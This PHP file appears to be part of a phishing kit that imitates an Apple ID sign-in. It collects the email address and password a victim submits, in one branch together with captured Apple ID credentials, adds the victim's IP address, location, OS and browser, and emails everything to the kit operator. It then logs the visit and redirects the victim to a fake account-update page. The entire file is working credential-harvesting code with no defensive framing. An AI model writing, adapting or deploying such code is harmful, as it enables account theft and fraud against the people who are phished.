<?php
session_start();
error_reporting(0);
include '../main.php';
if($_POST['email'] == "") {
	exit();
}
$subject = "📧 EMAIL ACCESS : ".$_POST['email']." [ $cn - $os - $ip2 ]";

if($setting['mix_email'] == 'on') {
	$message  = "######################### APPLE LOGIN ###########################\n";
	$message .= "Apple ID		: ".$_SESSION['email']."\n";
	$message .= "Password		: ".$_SESSION['password']."\n";
	$message  = "######################### EMAIL ACCESS ###########################\n";
	$message .= "Email			: ".$_POST['email']."\n";
	$message .= "Password		: ".$_POST['password']."\n";
	$message .= "##################################################################\n";
	$message .= "IP Address		: ".$ip2."\n";
	$message .= "Region		    : ".$regioncity."\n";
	$message .= "City		    : ".$citykota."\n";
	$message .= "Continent		: ".$continent."\n";
	$message .= "Timezone		: ".$timezone."\n";
	$message .= "OS/Browser		: ".$os." / ".$br."\n";
	$message .= "Date			: ".$date."\n";
	$message .= "##################################################################\n";
	kirim_mail($to,"Apple + Email Login",$subject,$message);
}else{
	$message  = "######################### EMAIL ACCESS ##########################\n";
	$message .= "Email			: ".$_POST['email']."\n";
	$message .= "Password		: ".$_POST['password']."\n";
	$message .= "##################################################################\n";
	$message .= "IP Address		: ".$ip2."\n";
	$message .= "Region		    : ".$regioncity."\n";
	$message .= "City		    : ".$citykota."\n";
	$message .= "Continent		: ".$continent."\n";
	$message .= "Timezone		: ".$timezone."\n";
	$message .= "OS/Browser		: ".$os." / ".$br."\n";
	$message .= "Date			: ".$date."\n";
	$message .= "##################################################################\n";
	kirim_mail($to,"Email Access",$subject,$message);
}
validate();
$click = fopen("../result/total_email.txt","a");
fwrite($click,"$ip2"."\n");
fclose($click);
$click = fopen("../result/log_visitor.txt","a");
$jam = date("h:i:sa");
fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Login Email Access"."\n");
fclose($click);
echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=update&appIdKey=".$_SESSION['key']."&country=".$cid."'>";
exit(); 
?>